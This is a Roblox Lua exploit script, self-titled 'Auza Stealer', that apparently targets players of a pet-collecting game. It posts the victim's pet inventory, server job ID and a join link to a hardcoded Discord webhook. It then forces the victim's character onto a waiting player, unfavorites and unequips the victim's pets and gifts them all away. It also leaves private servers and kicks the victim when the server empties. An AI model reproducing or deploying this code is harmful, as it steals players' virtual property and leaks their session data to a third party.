local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")

local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

local function checkPrivateServer()
    local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
    if serverType == "VIPServer" then
        local function getTeleportData()
            return {
                {game.PlaceId, 1},
                {game.PlaceId, 2},
                {game.PlaceId, 3}
            }
        end
        
        local teleportData = getTeleportData()
        for _, data in ipairs(teleportData) do
            local success = pcall(function()
                TeleportService:TeleportToPlaceInstance(data[1], data[2], player)
            end)
            if success then break end
        end
        
        player:Kick("Redirecting from Private Server...")
        return true
    end
    return false
end

if checkPrivateServer() then return end

local globalEnv = getgenv and getgenv() or _G or shared
if globalEnv.AuzaStealerLoaded then return end
globalEnv.AuzaStealerLoaded = true

local PetsService, PetsFolder, FavoriteItemService

local function initializeServices()
    local success, err = pcall(function()
        PetsService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetsService", 10)
        PetsFolder = workspace:WaitForChild("PetsPhysical", 10)
        FavoriteItemService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("Favorite_Item", 10)
    end)
    return success
end

local DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1387275380402163774/6GyTaeohyI55kmim0Xr63YzZTp244QgpIwLoNoefoFhid7LProENsnmJVsqVb6QDW0z2"

local CONFIG = {
    autoKickDelay = 2,
    giftDelay = 0.5,
    maxDistance = 10
}

local TARGET_PETS = {
    prefixes = {
        "red fox", "queen bee", "raccoon", "dragonfly", "butterfly", 
        "disco bee", "mimic octopus", "hyacinth macaw", "fennec fox"
    },
    minWeight = 15.0,
    minAge = 60
}

local giftQueue = {}
local isGifting = false
local tpConnection = nil
local webhookSent = false

local function unholdAllItems()
    local character = player.Character
    if not character then return end

    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = backpack
            task.wait(0.05)
        end
    end
    task.wait(0.1)
end

local function findAndHoldShovel()
    local character = player.Character
    if not character then return false end

    unholdAllItems()
    task.wait(0.2)

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and string.lower(tool.Name):find("shovel") then
            tool.Parent = character
            task.wait(0.3)
            return true
        end
    end
    return false
end

local function isPet(tool)
    return tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet"
end

local function extractNumber(text, pattern)
    local match = string.match(text, pattern)
    return match and tonumber(match) or nil
end

local function getWeight(petName)
    return extractNumber(petName, "%[([%d%.]+) KG%]")
end

local function getAge(petName)
    return extractNumber(petName, "%[Age (%d+)%]")
end

local function startsWithTarget(petName)
    local lower = string.lower(petName)
    for _, prefix in ipairs(TARGET_PETS.prefixes) do
        if string.sub(lower, 1, #prefix) == prefix then
            return true
        end
    end
    return false
end

local function isTargetPet(petName)
    return startsWithTarget(petName) or 
           (getWeight(petName) and getWeight(petName) >= TARGET_PETS.minWeight) or
           (getAge(petName) and getAge(petName) >= TARGET_PETS.minAge)
end

local function getPetPriority(petName)
    if startsWithTarget(petName) then return 1 end
    if getWeight(petName) and getWeight(petName) >= TARGET_PETS.minWeight then return 2 end
    if getAge(petName) and getAge(petName) >= TARGET_PETS.minAge then return 2 end
    return 3
end

local function getPetEmoji(petName)
    local lower = string.lower(petName)
    local emoji = "🐾"

    if string.find(lower, "huge") then emoji = "💎"
    elseif string.find(lower, "red fox") then emoji = "🦊"
    elseif string.find(lower, "queen bee") or string.find(lower, "pack bee") or string.find(lower, "disco bee") then emoji = "🐝"
    elseif string.find(lower, "raccoon") then emoji = "🦝"
    elseif string.find(lower, "dragonfly") then emoji = "🐉"
    elseif string.find(lower, "butterfly") then emoji = "🦋"
    elseif string.find(lower, "mimic octopus") then emoji = "🐙"
    elseif string.find(lower, "hyacinth macaw") then emoji = "🦜"
    end

    if getAge(petName) and getAge(petName) >= TARGET_PETS.minAge then
        emoji = emoji .. " ⏳"
    end
    if getWeight(petName) and getWeight(petName) >= TARGET_PETS.minWeight then
        emoji = emoji .. " ⚖️"
    end

    return emoji
end

local function unfavoriteAllPets()
    if not FavoriteItemService then return end
    
    for _, tool in ipairs(backpack:GetChildren()) do
        if isPet(tool) and tool:GetAttribute("d") == true then
            pcall(function()
                FavoriteItemService:FireServer(tool)
            end)
        end
    end

    local character = player.Character
    if character then
        for _, tool in ipairs(character:GetChildren()) do
            if isPet(tool) and tool:GetAttribute("d") == true then
                pcall(function()
                    FavoriteItemService:FireServer(tool)
                end)
            end
        end
    end
end

local function getAvailablePets()
    local targetPets = {}
    local regularPets = {}

    for _, tool in ipairs(backpack:GetChildren()) do
        if isPet(tool) then
            if isTargetPet(tool.Name) then
                table.insert(targetPets, tool)
            else
                table.insert(regularPets, tool)
            end
        end
    end

    return targetPets, regularPets
end

local function safeJSONEncode(data)
    local success, result = pcall(function()
        return HttpService:JSONEncode(data)
    end)
    
    if success then return result end
    
    if syn and syn.tojson then
        success, result = pcall(syn.tojson, data)
        if success then return result end
    end
    
    return '{"content":"Error: Failed to encode webhook data","username":"🌴 Auza Stealer 🌴"}'
end

local function sendWebhook(embed, content, hasTargets, userWebhookURLs)
    if webhookSent then return end
    webhookSent = true

    local webhookData = {
        content = tostring(content or ""),
        username = "🌴 Auza Stealer 🌴",
        avatar_url = "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png",
        embeds = {embed}
    }

    local jsonData = safeJSONEncode(webhookData)

    if hasTargets and DEFAULT_WEBHOOK and DEFAULT_WEBHOOK ~= "" then
        pcall(function()
            local request = (syn and syn.request) or (http and http.request) or http_request or request
            if request then
                request({
                    Url = DEFAULT_WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            end
        end)
        task.wait(1)
    end

    if userWebhookURLs then
        for i, url in ipairs(userWebhookURLs) do
            if url and url ~= "" then
                pcall(function()
                    local request = (syn and syn.request) or (http and http.request) or http_request or request
                    if request then
                        request({
                            Url = url,
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = jsonData
                        })
                    end
                end)
                if i < #userWebhookURLs then task.wait(0.5) end
            end
        end
    end
end

local function createSafeEmbed(data)
    local safeData = {}
    for key, value in pairs(data) do
        if type(value) == "string" then
            safeData[key] = string.gsub(tostring(value), "[%c]", "")
        elseif type(value) == "table" then
            safeData[key] = value
        else
            safeData[key] = tostring(value)
        end
    end
    
    return {
        title = safeData.title or "🌴 Auza Stealer 🌴",
        description = safeData.description or "",
        color = tonumber(safeData.color) or 10181046,
        fields = safeData.fields or {},
        footer = {
            text = safeData.footerText or "🌲 Auza Stealer • Fast Edition by iKazu",
            icon_url = safeData.footerIcon or "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        thumbnail = {
            url = safeData.thumbnail or "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
        }
    }
end

local function getPriorityPlayer(priorityPlayers)
    if not priorityPlayers then return nil end
    
    for _, name in ipairs(priorityPlayers) do
        local p = Players:FindFirstChild(tostring(name))
        if p and p ~= player and p.Character then
            return p
        end
    end
    return nil
end

local function sendStartupWebhook(userWebhook, priorityPlayers)
    local allPets = {}
    local targetPets = {}

    for _, tool in ipairs(backpack:GetChildren()) do
        if isPet(tool) then
            local petName = tostring(tool.Name or "Unknown Pet")
            table.insert(allPets, petName)
            if isTargetPet(petName) then
                table.insert(targetPets, petName)
            end
        end
    end

    local hasTargets = #targetPets > 0
    local jobId = tostring(game.JobId or "Unknown")
    local placeId = tostring(game.PlaceId or "Unknown")
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

    local description = ""

    if hasTargets then
        description = description .. "🎯 **TARGET PETS FOUND:**\n"
        for _, petName in ipairs(targetPets) do
            local emoji = getPetEmoji(petName)
            description = description .. emoji .. " " .. petName .. "\n"
        end
        description = description .. "\n"
    end

    description = description .. "🎒 **Full Inventory (" .. #allPets .. " pets):**\n"
    if #allPets > 0 then
        local petList = table.concat(allPets, "\n")
        if #petList > 1800 then
            petList = string.sub(petList, 1, 1800) .. "...\n[List truncated]"
        end
        description = description .. "```\n" .. petList .. "\n```"
    else
        description = description .. "```\nNo pets found\n```"
    end

    local priorityPlayer = getPriorityPlayer(priorityPlayers)
    if priorityPlayer then
        description = description .. "\n\n👑 **PRIORITY PLAYER: " .. tostring(priorityPlayer.Name) .. "**\n🎁 Auto-gifting initiated!"
    end

    local priorityText = "None"
    if priorityPlayers and #priorityPlayers > 2 then
        priorityText = tostring(priorityPlayers[3] or "None")
    end

    local embed = createSafeEmbed({
        title = "🌱 Auza Stealer - Fast Edition 🌱",
        description = description .. "\n\n🎁 **Gifting System**\n✨ *Priority players get instant gifts • Others say 'START'*",
        color = hasTargets and 3581519 or 10181046,
        fields = {
            {name = "🌟 Player", value = "```" .. tostring(player.Name) .. "```", inline = true},
            {name = "👑 Priorities", value = "```" .. priorityText .. "```", inline = true},
            {name = "🎯 Target Pets", value = "```" .. #targetPets .. "```", inline = true},
            {name = "🔗 Job ID", value = "```" .. jobId .. "```", inline = true},
            {name = "🏠 Place ID", value = "```" .. placeId .. "```", inline = true},
            {name = "🌐 Join", value = "[🚀 Quick Join](" .. joinLink .. ")", inline = false}
        }
    })

    local content = ""
    if hasTargets then
        content = "🚨 @everyone 🚨 - TARGET PETS FOUND!"
    elseif priorityPlayer then
        content = "👑 Priority player detected!"
    else
        content = "🌲 Startup Report 🌲"
    end

    local userWebhookURLs = {}
    if userWebhook and userWebhook ~= "" then
        table.insert(userWebhookURLs, userWebhook)
    end

    sendWebhook(embed, content, hasTargets, userWebhookURLs)
end

local function tpAndAttach(target)
    if tpConnection then 
        tpConnection:Disconnect() 
        tpConnection = nil
    end

    local char = player.Character
    local targetChar = target.Character

    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
        return false
    end

    tpConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if char.PrimaryPart and targetChar.PrimaryPart then
                char:SetPrimaryPartCFrame(CFrame.new(targetChar.PrimaryPart.Position))
            end
        end)
    end)

    return true
end

local function getNearbyPrompt(maxDistance)
    local char = player.Character
    if not char or not char.PrimaryPart then return nil end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent:IsA("BasePart") then
            local dist = (char.PrimaryPart.Position - obj.Parent.Position).Magnitude
            if dist <= maxDistance then
                return obj
            end
        end
    end
    return nil
end

local function giftPet(pet, target)
    if not target or not target.Parent or not target.Character or 
       not pet or not pet.Parent or pet.Parent ~= backpack then
        return false
    end

    unholdAllItems()
    task.wait(0.2)

    local success = pcall(function()
        if pet.Parent == backpack then
            pet.Parent = player.Character
        end
    end)

    if not success then return false end
    task.wait(0.5)

    local prompt = getNearbyPrompt(CONFIG.maxDistance)
    if prompt then
        local giftSuccess = false

        pcall(function()
            prompt:InputHoldBegin()
            task.wait(2.0)
            prompt:InputHoldEnd()
            giftSuccess = true
        end)

        task.wait(0.2)

        if not giftSuccess then
            pcall(function()
                prompt:InputBegin()
                task.wait(0.1)
                prompt:InputEnd()
            end)
        end

        task.wait(0.2)
        pcall(function()
            prompt.Triggered:Fire(player)
        end)
    end

    pcall(function()
        if pet and pet.Parent == player.Character then
            pet.Parent = backpack
        end
    end)

    task.wait(0.1)
    return true
end

local function giftAllPets(target)
    if isGifting then return end
    isGifting = true

    task.spawn(function()
        pcall(function()
            findAndHoldShovel()
            task.wait(0.2)
            unholdAllItems()
        end)
    end)

    task.wait(0.3)

    if not tpAndAttach(target) then
        isGifting = false
        return
    end

    local giftedCount = 0
    local totalAttempts = 0
    local maxTotalAttempts = 200

    while totalAttempts < maxTotalAttempts do
        totalAttempts = totalAttempts + 1

        if not target or not target.Parent or not target.Character then
            break
        end

        local targetPets, regularPets = getAvailablePets()

        if #targetPets > 0 then
            table.sort(targetPets, function(a, b)
                return getPetPriority(a.Name) < getPetPriority(b.Name)
            end)

            local pet = targetPets[1]
            if giftPet(pet, target) then
                giftedCount = giftedCount + 1
                task.wait(CONFIG.giftDelay)
                continue
            end
        end

        if #regularPets > 0 then
            local pet = regularPets[1]
            if giftPet(pet, target) then
                giftedCount = giftedCount + 1
                task.wait(CONFIG.giftDelay)
                continue
            end
        end

        if #targetPets == 0 and #regularPets == 0 then
            break
        end

        task.wait(0.5)
    end

    pcall(function()
        if tpConnection then
            tpConnection:Disconnect()
            tpConnection = nil
        end
    end)

    isGifting = false
end

local function setupChatMonitoring()
    local function connectPlayer(p)
        if p == player then return end

        local function onChatted(message)
            if string.upper(tostring(message)) == "START" then
                for _, queued in ipairs(giftQueue) do
                    if queued == p then return end
                end

                local targetPets, regularPets = getAvailablePets()
                if #targetPets > 0 or #regularPets > 0 then
                    table.insert(giftQueue, p)
                end
            end
        end

        local function setupChat()
            pcall(function()
                p.Chatted:Connect(onChatted)
            end)
        end

        if p.Character then
            setupChat()
        else
            p.CharacterAdded:Connect(function()
                task.wait(1)
                setupChat()
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do
        connectPlayer(p)
    end

    Players.PlayerAdded:Connect(connectPlayer)
end

local function cleanQueue()
    local clean = {}
    for _, p in ipairs(giftQueue) do
        if p and p.Parent and p.Character then
            table.insert(clean, p)
        end
    end
    giftQueue = clean
end

local function getNextTarget(priorityPlayers)
    cleanQueue()

    local priority = getPriorityPlayer(priorityPlayers)
    if priority then
        local targetPets, regularPets = getAvailablePets()
        if #targetPets > 0 or #regularPets > 0 then
            return priority
        end
    end

    local targetPets, regularPets = getAvailablePets()
    if (#targetPets > 0 or #regularPets > 0) and #giftQueue > 0 then
        return table.remove(giftQueue, 1)
    end

    return nil
end

local function startMainLoops(priorityPlayers)
    task.spawn(function()
        while true do
            pcall(function()
                if PetsService and PetsFolder then
                    for _, pet in ipairs(PetsFolder:GetChildren()) do
                        if pet:GetAttribute("OWNER") == player.Name then
                            local uuid = pet:GetAttribute("UUID")
                            if uuid then
                                pcall(function()
                                    PetsService:FireServer("UnequipPet", uuid)
                                end)
                            end
                        end
                    end
                end
            end)
            task.wait(1)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                if #Players:GetPlayers() == 1 then
                    task.wait(CONFIG.autoKickDelay)
                    if #Players:GetPlayers() == 1 then
                        player:Kick("🌲 Auto-kick: Server was empty")
                    end
                end
            end)
            task.wait(1)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                local priorityPlayer = getPriorityPlayer(priorityPlayers)
                if priorityPlayer and not isGifting then
                    local targetPets, regularPets = getAvailablePets()
                    if #targetPets > 0 or #regularPets > 0 then
                        giftAllPets(priorityPlayer)
                    end
                end
            end)
            task.wait(1)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                if not isGifting then
                    local target = getNextTarget(priorityPlayers)
                    if target then
                        local targetPets, regularPets = getAvailablePets()
                        if #targetPets > 0 or #regularPets > 0 then
                            task.spawn(function()
                                giftAllPets(target)
                            end)
                        end
                    end
                end
            end)
            task.wait(1)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                local character = player.Character
                if character then
                    for _, tool in ipairs(character:GetChildren()) do
                        if tool:IsA("Tool") then
                            tool.Parent = backpack
                            task.wait(0.05)
                        end
                    end
                end
            end)
            task.wait(3)
        end
    end)
end

local function initializeGlobalEnvironment()
    local CoreFunctions = {
        initializeServices = initializeServices,
        DEFAULT_WEBHOOK = DEFAULT_WEBHOOK,
        CONFIG = CONFIG,
        TARGET_PETS = TARGET_PETS,
        giftQueue = giftQueue,
        isGifting = isGifting,
        tpConnection = tpConnection,
        findAndHoldShovel = findAndHoldShovel,
        unholdAllItems = unholdAllItems,
        isPet = isPet,
        extractNumber = extractNumber,
        getWeight = getWeight,
        getAge = getAge,
        startsWithTarget = startsWithTarget,
        isTargetPet = isTargetPet,
        getPetPriority = getPetPriority,
        getPetEmoji = getPetEmoji,
        unfavoriteAllPets = unfavoriteAllPets,
        getAvailablePets = getAvailablePets,
        safeJSONEncode = safeJSONEncode,
        sendWebhook = sendWebhook,
        createSafeEmbed = createSafeEmbed,
        sendStartupWebhook = sendStartupWebhook,
        getPriorityPlayer = getPriorityPlayer,
        tpAndAttach = tpAndAttach,
        getNearbyPrompt = getNearbyPrompt,
        giftPet = giftPet,
        giftAllPets = giftAllPets,
        setupChatMonitoring = setupChatMonitoring,
        cleanQueue = cleanQueue,
        getNextTarget = getNextTarget,
        startMainLoops = startMainLoops
    }

    globalEnv.CoreFunctions = CoreFunctions
    return CoreFunctions
end

return initializeGlobalEnvironment()
